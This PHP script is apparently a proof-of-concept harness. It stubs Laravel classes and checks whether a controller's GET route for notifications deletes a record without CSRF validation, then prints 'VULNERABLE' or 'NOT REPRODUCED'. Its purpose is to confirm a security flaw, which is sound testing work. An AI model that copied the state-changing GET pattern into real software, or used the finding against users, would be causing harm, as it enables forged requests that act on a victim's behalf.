<?php
declare(strict_types=1);

namespace Illuminate\Http {
    final class RedirectResponse
    {
        public function __construct(public string $route, public array $params = []) {}
    }
}

namespace Illuminate\View {
    final class View {}
}

namespace Illuminate\Notifications {
    final class DatabaseNotification
    {
        public bool $deleted = false;

        public function __construct(public array $data) {}

        public function delete(): bool
        {
            $this->deleted = true;
            file_put_contents('/tmp/pinkary_notification_deleted', 'deleted-by-get-route');
            return true;
        }
    }
}

namespace App\Models {
    final class Question
    {
        public object $to;
        public ?object $answer;

        public function __construct(public int $id, bool $hasAnswer)
        {
            $this->answer = $hasAnswer ? (object)['id' => 9001] : null;
            $this->to = (object)['username' => 'victim-user'];
        }

        public static function findOrFail(int $id): self
        {
            // Simulate a notification whose associated question already has an answer.
            return new self($id, true);
        }
    }
}

namespace {
    use Illuminate\Http\RedirectResponse;

    function view(string $name): \Illuminate\View\View
    {
        return new \Illuminate\View\View();
    }

    function to_route(string $route, array $params = []): RedirectResponse
    {
        return new RedirectResponse($route, $params);
    }
}

namespace {
    require __DIR__ . '/original/NotificationController.php';

    use App\Http\Controllers\NotificationController;
    use Illuminate\Notifications\DatabaseNotification;

    @unlink('/tmp/pinkary_notification_deleted');

    $notification = new DatabaseNotification([
        'id' => 'notif-0001',
        'question_id' => 1337,
        'notifiable_id' => 'victim-user-id',
    ]);

    echo "[route] Original source maps GET /notifications/{notification} to NotificationController::show()\n";
    echo "[setup] Simulating an authenticated victim GET request with no CSRF token.\n";
    echo "[before] notification.deleted=" . ($notification->deleted ? 'true' : 'false') . "\n";

    $controller = new NotificationController();
    $response = $controller->show($notification);

    echo "[after] notification.deleted=" . ($notification->deleted ? 'true' : 'false') . "\n";
    echo "[redirect] route={$response->route}\n";

    if ($notification->deleted && file_exists('/tmp/pinkary_notification_deleted')) {
        echo "[VULNERABLE] GET /notifications/{notification} caused a persistent delete without CSRF validation.\n";
        exit(0);
    }

    echo "[NOT REPRODUCED] The notification was not deleted.\n";
    exit(1);
}
